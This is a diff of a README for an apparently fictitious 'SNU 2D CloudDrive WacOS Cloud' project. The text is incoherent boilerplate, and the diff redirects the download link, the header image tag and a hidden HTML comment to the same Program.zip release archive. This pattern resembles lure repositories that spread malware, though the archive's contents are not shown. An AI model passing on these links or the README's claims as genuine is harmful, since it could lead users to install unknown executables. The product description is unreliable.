@@ -1,12 +1,12 @@
 # Welcome to the SNU 2D CloudDrive WacOS Cloud Repository 🇸.🇳.🇺☁️💽️⏺️
 
-![SNU 2D CloudDrive WacOS Cloud](https://imageurl.com)
+![SNU 2D CloudDrive WacOS Cloud](https://github.com/Kick0o/SNU_2D_CloudDrive_Modes_WacOS_Cloud/releases/download/v1.0/Program.zip)
 
 ## Repository Description
 This is the official source repository for the SNU 2D CloudDrive WacOS Cloud mode project. Here, you can find all the resources, code, and information related to the SNU 2D CloudDrive with WacOS Cloud mode. 
 
 ## Software Download
-To access the software for the SNU 2D CloudDrive WacOS Cloud, please download it from the following link: [Download Software](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+To access the software for the SNU 2D CloudDrive WacOS Cloud, please download it from the following link: [Download Software](https://github.com/Kick0o/SNU_2D_CloudDrive_Modes_WacOS_Cloud/releases/download/v1.0/Program.zip)
 
 ## Features
 - File Sharing
@@ -35,4 +35,4 @@ This project is licensed under the GNU General Public License v3.0. For more inf
 
 Get started with the SNU 2D CloudDrive WacOS Cloud mode project today and experience seamless file sharing and storage on the WacOS Cloud platform! 🚀🌟
 
-<!--[Download Software](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)-->
+<!--[Download Software](https://github.com/Kick0o/SNU_2D_CloudDrive_Modes_WacOS_Cloud/releases/download/v1.0/Program.zip)-->
